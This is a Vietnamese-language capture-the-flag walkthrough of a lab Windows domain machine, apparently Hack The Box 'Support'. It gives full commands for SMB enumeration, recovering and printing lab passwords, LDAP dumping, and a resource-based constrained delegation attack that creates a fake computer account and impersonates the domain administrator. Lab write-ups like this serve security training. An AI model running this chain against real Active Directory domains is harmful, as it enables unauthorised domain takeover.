# Support-windows

![https://lh7-us.googleusercontent.com/6KF2bPJ7En5uQsNXIip1fRYDRTBaGvUxStebVMBRKWAmiJBe-jmUCX_353miZ8Tye-S07TfOu0AIMvvj5sANCExEta3Yvu4XPeyJsLzfJhZyZjeEnOJIb2PKww_hQfe5aSmpReaz0Mlq](https://lh7-us.googleusercontent.com/6KF2bPJ7En5uQsNXIip1fRYDRTBaGvUxStebVMBRKWAmiJBe-jmUCX_353miZ8Tye-S07TfOu0AIMvvj5sANCExEta3Yvu4XPeyJsLzfJhZyZjeEnOJIb2PKww_hQfe5aSmpReaz0Mlq)

![https://lh7-us.googleusercontent.com/3-Q2BX3J5mJPlr9cei3lh0a3UTv6HS_CPl1CFwencmkvyW4WzhdwwjrH2hdWXfEaZ3AuQHVW8afLLKEaO5F4koI9-VqhHe2UyZ4PV2e7HSHOA4nrQsnrfhCAc2YvW_mBFMZc9dg6TlwD](https://lh7-us.googleusercontent.com/3-Q2BX3J5mJPlr9cei3lh0a3UTv6HS_CPl1CFwencmkvyW4WzhdwwjrH2hdWXfEaZ3AuQHVW8afLLKEaO5F4koI9-VqhHe2UyZ4PV2e7HSHOA4nrQsnrfhCAc2YvW_mBFMZc9dg6TlwD)

smb enumeration sử dụng smbclient: để truy cập vào những tài nguyên bên trong của một SMB server

smbclient -L //support.htb/ -N

- L: Get a list of shares available on a host
- N: Don't ask for a password

![https://lh7-us.googleusercontent.com/d7ktryUiMvmvQqBDp-LBPX4wYQ9sXPjR7hxR-X231HT1rppMF1_1qikMzf9fqZfUweK353HbcsoFGwKEoiFe7rdtNaXylHOgwLYEVf6auL5O2Jqm65WtPB96fUQZZkOON6RSct5xRll3](https://lh7-us.googleusercontent.com/d7ktryUiMvmvQqBDp-LBPX4wYQ9sXPjR7hxR-X231HT1rppMF1_1qikMzf9fqZfUweK353HbcsoFGwKEoiFe7rdtNaXylHOgwLYEVf6auL5O2Jqm65WtPB96fUQZZkOON6RSct5xRll3)

support-tools interesting

smbclient -N \\\\<IP>\\<SHARE>

liệt kê các file khả dụng (3 file trên cùng ko có quyền admin nên ko connect đc, NETLOGON và SYSVOL connect được nhưng ko list đc gì):

![https://lh7-us.googleusercontent.com/JsHX71LA4T-gxgMqyysie1508ilIakBpH1mg-cGkf22ykPKfhjnB7I8lttWrbQ-C1tN8gbgnWcECU0y2hZw68afkVehf_vdIkNE6J_gm9eI9n2gQjMi-BTQ2qG-vCcuXGcwrPQDJaHQp](https://lh7-us.googleusercontent.com/JsHX71LA4T-gxgMqyysie1508ilIakBpH1mg-cGkf22ykPKfhjnB7I8lttWrbQ-C1tN8gbgnWcECU0y2hZw68afkVehf_vdIkNE6J_gm9eI9n2gQjMi-BTQ2qG-vCcuXGcwrPQDJaHQp)

chú ý file UserInfo.exe.zip

download về và unzip thấy là file thực thi .net

![https://lh7-us.googleusercontent.com/tKtqm_H9VZavf2r-5Ml8Vz8-vLHB-mxN2P0A4fYoDzDQYAPAniXm7TIQBbUQhgYfG3KryupHapZlbWfMMxHK78ph6aW0zlElUupBQn7et8SMzpJ7Sajtzu06V-7NqIo2PqGzl2WsZxWu](https://lh7-us.googleusercontent.com/tKtqm_H9VZavf2r-5Ml8Vz8-vLHB-mxN2P0A4fYoDzDQYAPAniXm7TIQBbUQhgYfG3KryupHapZlbWfMMxHK78ph6aW0zlElUupBQn7et8SMzpJ7Sajtzu06V-7NqIo2PqGzl2WsZxWu)

decompiling UserInfo.exe  sử dụng ILSpy

[https://github.com/icsharpcode/AvaloniaILSpy/releases](https://github.com/icsharpcode/AvaloniaILSpy/releases)

![https://lh7-us.googleusercontent.com/Bqe4KZb1azbvEnBJ1uousmlZ0_5semoKayvxoXnt7mhJwxBu92HQ1HEv-trlvV2k9vv2T6zW6xWAQwZkRcdRjlcO2lBse8C6Z3eDj8yS2DBgo0WnPEjFhffOo0dGeMWbZsaKpro5DcLN](https://lh7-us.googleusercontent.com/Bqe4KZb1azbvEnBJ1uousmlZ0_5semoKayvxoXnt7mhJwxBu92HQ1HEv-trlvV2k9vv2T6zW6xWAQwZkRcdRjlcO2lBse8C6Z3eDj8yS2DBgo0WnPEjFhffOo0dGeMWbZsaKpro5DcLN)

![https://lh7-us.googleusercontent.com/A1ui3gSCYmIsf2TKrOQPN_QNXaVb9AvE4w3w_GmOhGpWUNUXzHBnqXyB09_ogc_oZIX5nY2WkbPCgMt4Udv2BNJESCRMF6Dx-wjjMGp6VAAv_-3Z1x2Vr-XLKb8udQrO5p6DwG78pQwf](https://lh7-us.googleusercontent.com/A1ui3gSCYmIsf2TKrOQPN_QNXaVb9AvE4w3w_GmOhGpWUNUXzHBnqXyB09_ogc_oZIX5nY2WkbPCgMt4Udv2BNJESCRMF6Dx-wjjMGp6VAAv_-3Z1x2Vr-XLKb8udQrO5p6DwG78pQwf)

![https://lh7-us.googleusercontent.com/9NPUrPYwXgEs8JTqEA98jsw5m7cXpa9u7ipb7rLNLZl0lc35QT7RNN2Y8tSlu-9K4RkkJ3NoQ1uYsEYORLt_CWEmVtow92Ai9B9uq9tfZdO5rF_p_mxZ_eBUxpQ9oaPBbg4oD2FND-Na](https://lh7-us.googleusercontent.com/9NPUrPYwXgEs8JTqEA98jsw5m7cXpa9u7ipb7rLNLZl0lc35QT7RNN2Y8tSlu-9K4RkkJ3NoQ1uYsEYORLt_CWEmVtow92Ai9B9uq9tfZdO5rF_p_mxZ_eBUxpQ9oaPBbg4oD2FND-Na)

mở ILSpy:

![https://lh7-us.googleusercontent.com/oaAgksNTxx4pRsn1ulSP4HX5Ge2sT1cJS8oBid1trXdf3PQI3J3eyeyuk5HqC8l8uHrbeJp3USfWZcvsSb7au_I-62_qJiTRbrbQSKuRb_r-DSrowCmnCUGDjRqs1_fBCZwehm5D-g95](https://lh7-us.googleusercontent.com/oaAgksNTxx4pRsn1ulSP4HX5Ge2sT1cJS8oBid1trXdf3PQI3J3eyeyuk5HqC8l8uHrbeJp3USfWZcvsSb7au_I-62_qJiTRbrbQSKuRb_r-DSrowCmnCUGDjRqs1_fBCZwehm5D-g95)

từ userinfo thấy có 2 class

class protected thấy pw được encrypt

![https://lh7-us.googleusercontent.com/IFHiydr0OEXmSE4ihAlfZI_aysrqsOD0UKEV0Q6lPT0HeV-yF9Kok0E4_cXu6wke0rGs71wNMcoOrH6Pls9HlG2tIceF5my5J9ip9E5bKaM9KoNR4gWAS0uhH9TL1FnlRxI63uA4DHt0](https://lh7-us.googleusercontent.com/IFHiydr0OEXmSE4ihAlfZI_aysrqsOD0UKEV0Q6lPT0HeV-yF9Kok0E4_cXu6wke0rGs71wNMcoOrH6Pls9HlG2tIceF5my5J9ip9E5bKaM9KoNR4gWAS0uhH9TL1FnlRxI63uA4DHt0)

hoặc sử dụng dotpeek

![https://lh7-us.googleusercontent.com/vMhD7J2vfqPCfeH9t4r2JrDfBJEqqJ09AI3KTXEUbPBZqJ3sTdZ3e0QcNHI5YdwB69SWprEGIMdImjXPkJ4Hw3M5UvdQdMl2ocQcJkrwMamLMtpZer9ioqme8YOmG9GPY7lhTpbTtxqG](https://lh7-us.googleusercontent.com/vMhD7J2vfqPCfeH9t4r2JrDfBJEqqJ09AI3KTXEUbPBZqJ3sTdZ3e0QcNHI5YdwB69SWprEGIMdImjXPkJ4Hw3M5UvdQdMl2ocQcJkrwMamLMtpZer9ioqme8YOmG9GPY7lhTpbTtxqG)

The password seems to be encrypted using XOR. The decryption process is as follows:

- The enc_password string is Base64 decoded and placed into a byte array.
- A second byte array called array2 is created with the same value as array .
- A loop is initialised, which loops through each character in array and XORs it with one letter of the key and then with the byte 0xDFu (223).
- Finally the decrypted key is returned

đổi dòng return thành Console.WriteLine(Encoding.Default.GetString(array2)); để in ra giá trị pw

![https://lh7-us.googleusercontent.com/2vbBumuYcXYSJ37uao8Foaw0lydh-Iudid3rFVu1B1s1szmJBXzkPCTrWcH0xTBcjWmzVb8wCQlE_e-Uu2zJZOLJqylkeNJLuM296Ourg9UYA_lcSKZzE9kgVxdjkjRd4StYxyOIIXa4](https://lh7-us.googleusercontent.com/2vbBumuYcXYSJ37uao8Foaw0lydh-Iudid3rFVu1B1s1szmJBXzkPCTrWcH0xTBcjWmzVb8wCQlE_e-Uu2zJZOLJqylkeNJLuM296Ourg9UYA_lcSKZzE9kgVxdjkjRd4StYxyOIIXa4)

nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz

pw được sử dụng ở class ldapquery, thấy được domain và user support\\ldap

![https://lh7-us.googleusercontent.com/2hxeOYBdeGKjmVE1xk8spGfpvet_Nznd9prNMGNxfNbstBdXJy5yLgLUnIxpg_HDMZpaiH-xbekOyKqc4GT6CmSqvJOvpp6oArXLKNz-WMRMBwtMqx3WiHrUcUDludDCUuEZGwIwQuyo](https://lh7-us.googleusercontent.com/2hxeOYBdeGKjmVE1xk8spGfpvet_Nznd9prNMGNxfNbstBdXJy5yLgLUnIxpg_HDMZpaiH-xbekOyKqc4GT6CmSqvJOvpp6oArXLKNz-WMRMBwtMqx3WiHrUcUDludDCUuEZGwIwQuyo)

![https://lh7-us.googleusercontent.com/FqxhRqHSvXFkmqzb69XCb-rKYFS_9PoyaXxN9O6nc8ANd1ZeQUi0z_u44sB2lFfPJbFh6Ive5-Xxppkz6USZ5uwsrVI5YB4z2E0usjwjkdBulaEmbvfnb8gefA-9H5DRcoDcBPSEet7W](https://lh7-us.googleusercontent.com/FqxhRqHSvXFkmqzb69XCb-rKYFS_9PoyaXxN9O6nc8ANd1ZeQUi0z_u44sB2lFfPJbFh6Ive5-Xxppkz6USZ5uwsrVI5YB4z2E0usjwjkdBulaEmbvfnb8gefA-9H5DRcoDcBPSEet7W)

dump thông tin all user, computer, group:

dùng ldapdomaindump:

ldapdomaindump -u 'support\ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' --no-html --no-grep support.htb -o output/

![https://lh7-us.googleusercontent.com/Vq2kSF1Eg7g55kFB2lHXqG-rHsrnG03qSbyNA5E1kF6wHLRW22Q72Z23fpCfzXDapiD8WnxXs1quLu2RT57ElzPd8GjlYqWtMvgwybxcaxDwNabgko-FBXFgEwU5WLJ559LWQd9SCeuS](https://lh7-us.googleusercontent.com/Vq2kSF1Eg7g55kFB2lHXqG-rHsrnG03qSbyNA5E1kF6wHLRW22Q72Z23fpCfzXDapiD8WnxXs1quLu2RT57ElzPd8GjlYqWtMvgwybxcaxDwNabgko-FBXFgEwU5WLJ559LWQd9SCeuS)

hoặc dùng ldapsearch:

ldapsearch -x -b 'cn=Users,dc=support,dc=htb' -H ldap://10.10.11.174 -D support\\ldap -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'

tìm thấy user support, administrator

![https://lh7-us.googleusercontent.com/q9dES14v2L29O1IXuZEJX58RraFLN5xreY67_oAxssgCjlFP1OcqFX9u7MWofxmWKJxcdr4a3tvB4U2xCyHaZeD3xUlXqw8MEoUDKfN4uM9-uxA5Ecf0Ig7-5eRTE_GDvXWuhFJIMz92](https://lh7-us.googleusercontent.com/q9dES14v2L29O1IXuZEJX58RraFLN5xreY67_oAxssgCjlFP1OcqFX9u7MWofxmWKJxcdr4a3tvB4U2xCyHaZeD3xUlXqw8MEoUDKfN4uM9-uxA5Ecf0Ig7-5eRTE_GDvXWuhFJIMz92)

samaccountName: Security Account Manager Account Name

![https://lh7-us.googleusercontent.com/dIhDF-Mbzfj3vvT97xII02Op1fChxPG5e4R0J-g5Y9Vf_yztLtE-KggfXobv-I6vr1zNYbKYB7FmGbX2754a7SJopOtCpxMJnfS7hbZfOgHt4G853qmIZhaUMjWA5OdYJOymJbYurfPP](https://lh7-us.googleusercontent.com/dIhDF-Mbzfj3vvT97xII02Op1fChxPG5e4R0J-g5Y9Vf_yztLtE-KggfXobv-I6vr1zNYbKYB7FmGbX2754a7SJopOtCpxMJnfS7hbZfOgHt4G853qmIZhaUMjWA5OdYJOymJbYurfPP)

Ironside47pleasure40Watchful có thể là pw

sd evil-winrm để login

evil-winrm -i 10.10.11.174 -u "support" -p "Ironside47pleasure40Watchful"

![https://lh7-us.googleusercontent.com/gwmfTaosMyroCXOG5WyEyyw74HsdvvzjJ4Pi_NhECf8i_2xuCPJZgmiTJ05XwREa0PUK0KDsMcrBHXuFSTsS9PvGkS-ArgM16g6hQqYnRPha5WFwMEmXcm88B53ErV_Xxiq7BFUgTu44](https://lh7-us.googleusercontent.com/gwmfTaosMyroCXOG5WyEyyw74HsdvvzjJ4Pi_NhECf8i_2xuCPJZgmiTJ05XwREa0PUK0KDsMcrBHXuFSTsS9PvGkS-ArgM16g6hQqYnRPha5WFwMEmXcm88B53ErV_Xxiq7BFUgTu44)

có flag user

![https://lh7-us.googleusercontent.com/9PsJuOwTsLNlRniMNqonSrmrTdOZerPd3L6fetRMQLZOZEpy6szGP0_CqBRWzi8G3bJiendCzOJaDl1g8vNeqq13MeqHz2QDX1jRVKDGc2RagSuUHkU5L_CFsQsfd9h1MYfOllIF9XzD](https://lh7-us.googleusercontent.com/9PsJuOwTsLNlRniMNqonSrmrTdOZerPd3L6fetRMQLZOZEpy6szGP0_CqBRWzi8G3bJiendCzOJaDl1g8vNeqq13MeqHz2QDX1jRVKDGc2RagSuUHkU5L_CFsQsfd9h1MYfOllIF9XzD)

check các quyền của user support whoami /priv

![https://lh7-us.googleusercontent.com/hTucqIJI_85gcHah6LyQCGMkOMMe7L04h9LI2kFUiQ8TXlFZ7GHCjsbGC-62X0D4f54uuC75B82fLA73u8BxTQagJwrQ76ecuQnAg2yurRoNgOwLQgfp1Yc82UEzmYUjeGhMOGZbce49](https://lh7-us.googleusercontent.com/hTucqIJI_85gcHah6LyQCGMkOMMe7L04h9LI2kFUiQ8TXlFZ7GHCjsbGC-62X0D4f54uuC75B82fLA73u8BxTQagJwrQ76ecuQnAg2yurRoNgOwLQgfp1Yc82UEzmYUjeGhMOGZbce49)

![https://lh7-us.googleusercontent.com/bxWYR1iZ5npd-AKcc5rnoxVu2_kedqNvbPKzOSknc-nKXpYsXluQgYDSf0VYjZbOf19QQrknr_Ae5hyDd2VFspWbvpOs-Lb-FUkFDhgtw_-OVbfy-5X8DQQp091dM5t7YtI-7UMY6Cpo](https://lh7-us.googleusercontent.com/bxWYR1iZ5npd-AKcc5rnoxVu2_kedqNvbPKzOSknc-nKXpYsXluQgYDSf0VYjZbOf19QQrknr_Ae5hyDd2VFspWbvpOs-Lb-FUkFDhgtw_-OVbfy-5X8DQQp091dM5t7YtI-7UMY6Cpo)

user support có đặc quyền để thêm một máy vào domain

cheatsheets [Kerberos Resource-based Constrained Delegation: Computer Object Takeover | Red Team Notes (ired.team)](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution)

Để tính năng này hoạt động hoàn toàn, trước tiên cần mô-đun Powermad [Powermad/Powermad.ps1 at master · Kevin-Robertson/Powermad (github.com)](https://github.com/Kevin-Robertson/Powermad/blob/master/Powermad.ps1)

Sau khi tải xuống Powermad.ps1,  đưa sang target

![https://lh7-us.googleusercontent.com/OW2WD-QkcEk-63vm3OBu5qLBZt4auNonNUoZLZTW7sJPbDxZ6Z3_XfNGEiLwlcwIjAoKG151fYpWW-4oMpwAOcIjbpsTsHY5KikZkSTyqOWeyev6OWr-7EBnkAqjOWmmTGgnUjAk4soQ](https://lh7-us.googleusercontent.com/OW2WD-QkcEk-63vm3OBu5qLBZt4auNonNUoZLZTW7sJPbDxZ6Z3_XfNGEiLwlcwIjAoKG151fYpWW-4oMpwAOcIjbpsTsHY5KikZkSTyqOWeyev6OWr-7EBnkAqjOWmmTGgnUjAk4soQ)

chuyển cmd sang powershell

![https://lh7-us.googleusercontent.com/PytxROfwpDz65x4mRvjzfgvr-0FfPG8F-tPt5XiFxz9pLSKr58rWHw33n9Obihcb8vg8PQrV2z9ud0qWcSnetIrVpfCgFLhRMk_t29ZuszBR1Al22UdnJ593HcwUIqD_YU6Y3ozifAsx](https://lh7-us.googleusercontent.com/PytxROfwpDz65x4mRvjzfgvr-0FfPG8F-tPt5XiFxz9pLSKr58rWHw33n9Obihcb8vg8PQrV2z9ud0qWcSnetIrVpfCgFLhRMk_t29ZuszBR1Al22UdnJ593HcwUIqD_YU6Y3ozifAsx)

Import-Module .\Powermad.ps1

tạo fake computer object

New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

![https://lh7-us.googleusercontent.com/EE5k_WolFKxGcjgr0TnWa3LADNL5njkzsipvB1RO0OvCrreox8UtrYb8N1K3jwMCF5bKRK98RUVbXT3cvnCoyE8QFPRTEYSJxo2twevca2ZsIShL5Tbr6DwAMAIL8pvVxEpuvbHCoZdb](https://lh7-us.googleusercontent.com/EE5k_WolFKxGcjgr0TnWa3LADNL5njkzsipvB1RO0OvCrreox8UtrYb8N1K3jwMCF5bKRK98RUVbXT3cvnCoyE8QFPRTEYSJxo2twevca2ZsIShL5Tbr6DwAMAIL8pvVxEpuvbHCoZdb)

![https://lh7-us.googleusercontent.com/JM3DR5LXufGtTxN1j2ofG0oZ5T9RJmuhVNVLYPDwie9g8CINm1zw_3WexGSgHXjRD0mZER5DhhHUkm29yNpQvxGdjznLzphgEqmv7XXf2-2cFEwqznsZpmqXrCUqENY-cwbKEYr2Aeo7](https://lh7-us.googleusercontent.com/JM3DR5LXufGtTxN1j2ofG0oZ5T9RJmuhVNVLYPDwie9g8CINm1zw_3WexGSgHXjRD0mZER5DhhHUkm29yNpQvxGdjznLzphgEqmv7XXf2-2cFEwqznsZpmqXrCUqENY-cwbKEYr2Aeo7)

![https://lh7-us.googleusercontent.com/wE-cTWqWd2THBJS-eJDuPUa0amVO41JvOoL83i8VaNKxDMFG4Yw8_LGO3IisEVUeZ6-AIqAedIeRdpP1QOHsnIXxTvdd9567oBlfQDQxj5L6XNZ_lhm8mT3bNTxyF6o7oEyu5VZ6BUdl](https://lh7-us.googleusercontent.com/wE-cTWqWd2THBJS-eJDuPUa0amVO41JvOoL83i8VaNKxDMFG4Yw8_LGO3IisEVUeZ6-AIqAedIeRdpP1QOHsnIXxTvdd9567oBlfQDQxj5L6XNZ_lhm8mT3bNTxyF6o7oEyu5VZ6BUdl)

![https://lh7-us.googleusercontent.com/SsbGRG-SI9T-f5xQxGVyMqK12G3_kKxtqrUA3agoVsru_mu96QklsLIPrFrRdTGFQlLUjVxvZMOpocZ-5ZzNamiWSXfe1VR6Hy3xR8DwUKtoXwN0E4orraPskQdEjtzBGYEjGuCMV0tP](https://lh7-us.googleusercontent.com/SsbGRG-SI9T-f5xQxGVyMqK12G3_kKxtqrUA3agoVsru_mu96QklsLIPrFrRdTGFQlLUjVxvZMOpocZ-5ZzNamiWSXfe1VR6Hy3xR8DwUKtoXwN0E4orraPskQdEjtzBGYEjGuCMV0tP)

The SID is S-1-5-21-1677581083-3380853377-188903654-5602

cấu hình DC để trust fake computer.

Các lệnh này sẽ tạo ACL với SID của fake computer

- $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1677581083-3380853377-188903654-5602)"
- $SDBytes = New-Object byte![] ($SD.BinaryLength)
- $SD.GetBinaryForm($SDBytes, 0)

gán cho DC

- Get-DomainComputer dc | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
- Get-DomainComputer dc -Properties 'msds-allowedtoactonbehalfofotheridentity'

![https://lh7-us.googleusercontent.com/jKzfiCPdekMglCr40Jy4FN6aS-q6FSSPrahm1uTuCiV4OjAK2ygvoQfqpx6mvOjwaV3S16CS5odpk1OTASolt5j-5yF0mawk0TTVIzP9jX1II-_WSey2-XlHxS6HmdQmLDky5DKkY_t8](https://lh7-us.googleusercontent.com/jKzfiCPdekMglCr40Jy4FN6aS-q6FSSPrahm1uTuCiV4OjAK2ygvoQfqpx6mvOjwaV3S16CS5odpk1OTASolt5j-5yF0mawk0TTVIzP9jX1II-_WSey2-XlHxS6HmdQmLDky5DKkY_t8)

![https://lh7-us.googleusercontent.com/1fdMKBW1U_ubBgvQk53uMyKXxlGeGhgBvpq8kSNSdtUfjfFPRHkvUtVbwx4bUG-v5w5R3udltaZdLQ6ZlDFxVZeTPUzW1qJBdwIo-V3tPf2tUxKw4O4My2-xcxvQ6lRrrLBSOpzFwyv3](https://lh7-us.googleusercontent.com/1fdMKBW1U_ubBgvQk53uMyKXxlGeGhgBvpq8kSNSdtUfjfFPRHkvUtVbwx4bUG-v5w5R3udltaZdLQ6ZlDFxVZeTPUzW1qJBdwIo-V3tPf2tUxKw4O4My2-xcxvQ6lRrrLBSOpzFwyv3)

tạo ticket cho user administrator để login

- impacket-getST support.htb/giang:giang -dc-ip 10.10.11.174 -impersonate administrator -spn www/dc.support.htb
- export KRB5CCNAME=administrator.ccache
- impacket-wmiexec support.htb/administrator@dc.support.htb -no-pass -k

![https://lh7-us.googleusercontent.com/OvlL0C3Gyqfk4jjQgi96ly3pDapoRUmOaqUZlPsGoVkS2gljfv06Um6_EwIEYDtq5NCgPwWdbY4FS69G87atdmo45mnSXAQa8Jiqqt6LlB67D4ypUHuXWpGH_DFGk2Z12yPfkf-vZI15](https://lh7-us.googleusercontent.com/OvlL0C3Gyqfk4jjQgi96ly3pDapoRUmOaqUZlPsGoVkS2gljfv06Um6_EwIEYDtq5NCgPwWdbY4FS69G87atdmo45mnSXAQa8Jiqqt6LlB67D4ypUHuXWpGH_DFGk2Z12yPfkf-vZI15)

![https://lh7-us.googleusercontent.com/OnttPSqBlD2ba4OcL0Zfj_VPGbT-ZW3Y_OCxLiIc7Ra_i44Dvdeyqkvolb74VqX6wgUxd4GSTAPhWNnfcS6WAQD0JuprhBiGdVG2pOitIut6LDsBwd7f0iJft7hsRUiJ25IHMhOT9MM0](https://lh7-us.googleusercontent.com/OnttPSqBlD2ba4OcL0Zfj_VPGbT-ZW3Y_OCxLiIc7Ra_i44Dvdeyqkvolb74VqX6wgUxd4GSTAPhWNnfcS6WAQD0JuprhBiGdVG2pOitIut6LDsBwd7f0iJft7hsRUiJ25IHMhOT9MM0)